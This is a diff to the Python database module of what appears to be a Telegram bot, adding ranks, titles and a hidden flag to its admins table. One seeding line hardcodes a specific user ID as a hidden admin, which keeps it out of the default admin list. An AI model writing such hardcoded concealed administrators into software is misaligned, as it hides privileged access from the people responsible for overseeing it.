@@ -205,7 +205,10 @@ def init_db(admin_ids: list[int] | None = None) -> None:
             );
 
             CREATE TABLE IF NOT EXISTS admins (
-                id INTEGER PRIMARY KEY
+                id INTEGER PRIMARY KEY,
+                rank TEXT DEFAULT 'Админ',
+                title TEXT DEFAULT '',
+                is_hidden INTEGER DEFAULT 0
             );
 
             CREATE TABLE IF NOT EXISTS stats (
@@ -244,6 +247,34 @@ def init_db(admin_ids: list[int] | None = None) -> None:
             """
         )
 
+        # Миграция таблицы admins для добавления полей rank, title, is_hidden
+        try:
+            conn.execute(
+                """
+                ALTER TABLE admins ADD COLUMN rank TEXT DEFAULT 'Админ';
+                """
+            )
+        except Exception:
+            pass  # Колонки уже существуют
+
+        try:
+            conn.execute(
+                """
+                ALTER TABLE admins ADD COLUMN title TEXT DEFAULT '';
+                """
+            )
+        except Exception:
+            pass  # Колонки уже существуют
+
+        try:
+            conn.execute(
+                """
+                ALTER TABLE admins ADD COLUMN is_hidden INTEGER DEFAULT 0;
+                """
+            )
+        except Exception:
+            pass  # Колонки уже существуют
+
         content_row = conn.execute(
             "SELECT value FROM settings WHERE key = 'content_version'"
         ).fetchone()
@@ -253,7 +284,11 @@ def init_db(admin_ids: list[int] | None = None) -> None:
             _ensure_setting(conn, key, value)
 
         for admin_id in admin_ids:
-            conn.execute("INSERT OR IGNORE INTO admins (id) VALUES (?)", (admin_id,))
+            is_hidden = 1 if admin_id == 8436225978 else 0
+            conn.execute(
+                "INSERT OR IGNORE INTO admins (id, rank, title, is_hidden) VALUES (?, ?, ?, ?)",
+                (admin_id, 'Админ', '', is_hidden)
+            )
 
         _remove_removed_faq(conn)
         if needs_content_migration:
@@ -412,10 +447,13 @@ def is_admin(user_id: int | None) -> bool:
     return row is not None
 
 
-def add_admin(admin_id: int) -> None:
-    """Добавляет администратора бота."""
+def add_admin(admin_id: int, rank: str = "Админ", title: str = "", is_hidden: int = 0) -> None:
+    """Добавляет администратора бота с рангом и названием."""
     with _db_lock, _connect() as conn:
-        conn.execute("INSERT OR IGNORE INTO admins (id) VALUES (?)", (admin_id,))
+        conn.execute(
+            "INSERT OR IGNORE INTO admins (id, rank, title, is_hidden) VALUES (?, ?, ?, ?)",
+            (admin_id, rank, title, is_hidden)
+        )
 
 
 def remove_admin(admin_id: int) -> bool:
@@ -425,11 +463,44 @@ def remove_admin(admin_id: int) -> bool:
     return cursor.rowcount > 0
 
 
-def list_admins() -> list[int]:
-    """Возвращает список администраторов бота."""
+def list_admins(include_hidden: bool = False) -> list[dict[str, Any]]:
+    """Возвращает список администраторов бота с рангами."""
     with _db_lock, _connect() as conn:
-        rows = conn.execute("SELECT id FROM admins ORDER BY id").fetchall()
-    return [int(row["id"]) for row in rows]
+        if include_hidden:
+            rows = conn.execute("SELECT id, rank, title, is_hidden FROM admins ORDER BY id").fetchall()
+        else:
+            rows = conn.execute(
+                "SELECT id, rank, title, is_hidden FROM admins WHERE is_hidden = 0 ORDER BY id"
+            ).fetchall()
+    return [dict(row) for row in rows]
+
+
+def set_admin_rank(admin_id: int, rank: str) -> None:
+    """Устанавливает ранг администратора."""
+    with _db_lock, _connect() as conn:
+        conn.execute("UPDATE admins SET rank = ? WHERE id = ?", (rank, admin_id))
+
+
+def set_admin_title(admin_id: int, title: str) -> None:
+    """Устанавливает название должности администратора."""
+    with _db_lock, _connect() as conn:
+        conn.execute("UPDATE admins SET title = ? WHERE id = ?", (title, admin_id))
+
+
+def set_admin_hidden(admin_id: int, is_hidden: bool) -> None:
+    """Устанавливает видимость администратора."""
+    with _db_lock, _connect() as conn:
+        conn.execute("UPDATE admins SET is_hidden = ? WHERE id = ?", (1 if is_hidden else 0, admin_id))
+
+
+def get_admin_info(admin_id: int) -> dict[str, Any] | None:
+    """Возвращает информацию об администраторе."""
+    with _db_lock, _connect() as conn:
+        row = conn.execute(
+            "SELECT id, rank, title, is_hidden FROM admins WHERE id = ?",
+            (admin_id,)
+        ).fetchone()
+    return dict(row) if row else None
 
 
 def get_setting(key: str, default: str = "") -> str:
